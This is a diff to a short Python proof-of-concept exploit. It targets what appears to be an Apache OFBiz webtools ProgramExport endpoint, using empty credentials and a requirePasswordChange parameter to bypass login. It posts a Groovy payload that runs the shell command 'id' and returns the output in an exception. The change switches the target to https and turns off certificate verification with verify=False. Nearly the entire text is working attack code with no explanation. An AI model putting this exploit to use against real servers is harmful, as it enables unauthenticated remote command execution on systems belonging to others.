@@ -1,6 +1,6 @@
 import requests
 
-url = "http://192.168.1.67:8443/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
+url = "https://192.168.1.67:8443/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
 
 headers = {
     "Accept-Encoding": "gzip, deflate, br",
@@ -14,6 +14,6 @@ headers = {
 
 data = "groovyProgram=throw+new+Exception('id'.execute().text);"
 
-response = requests.post(url, headers=headers, data=data)
+response = requests.post(url, headers=headers, data=data, verify=False)
 
 print(response.text)
